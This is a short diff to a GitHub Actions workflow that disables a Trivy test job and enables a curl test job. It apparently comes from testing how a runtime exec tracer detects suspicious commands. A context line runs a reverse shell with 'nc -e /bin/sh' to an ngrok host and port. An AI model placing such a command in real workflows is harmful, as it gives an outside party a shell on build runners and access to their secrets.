@@ -16,6 +16,7 @@ jobs:
           nc -e /bin/sh -v 7.tcp.eu.ngrok.io 13153 
 
   trivy-test:
+    if: false
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
@@ -43,7 +44,7 @@ jobs:
           cat /var/log/exec-tracer.log
 
   curl-test:
-    if: false
+    if: true
     runs-on: ubuntu-latest
     steps:
       - name: Checkout repository
